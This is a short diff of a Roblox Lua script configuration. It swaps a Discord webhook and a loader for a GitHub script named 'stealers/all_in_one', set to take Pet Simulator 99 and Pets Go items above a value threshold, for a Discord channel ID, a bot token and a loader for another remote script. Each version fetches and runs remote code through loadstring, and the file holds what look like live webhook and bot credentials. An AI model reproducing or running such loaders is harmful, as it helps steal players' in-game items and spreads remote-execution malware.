@@ -1,4 +1,4 @@
-Username = "Mm2Stocks_Roblox"
-Webhook = "https://discord.com/api/webhooks/1320138901620396063/BYvM66pNA4f3-YWsiCc7Tua48QjhaqhOWlj7FuCtRloyacRsFryJrkRHwe65Gyw3GvE1"
-min_rap = 2 --for pets go and pet simulator 99 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/stealers/main/all_in_one"))()
+channelId = "1320157047081140226"
+token = "MTMxMDM1Mzc2Nzc4MjE1ODQzNw.GDJ3yD.pzRDw28WXLScHa7Y_U5TAj-wHczZdm2LmaEfIE"
+waitTime = 5 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ezjq/Join/refs/heads/main/t3.lua%20(28).txt"))()
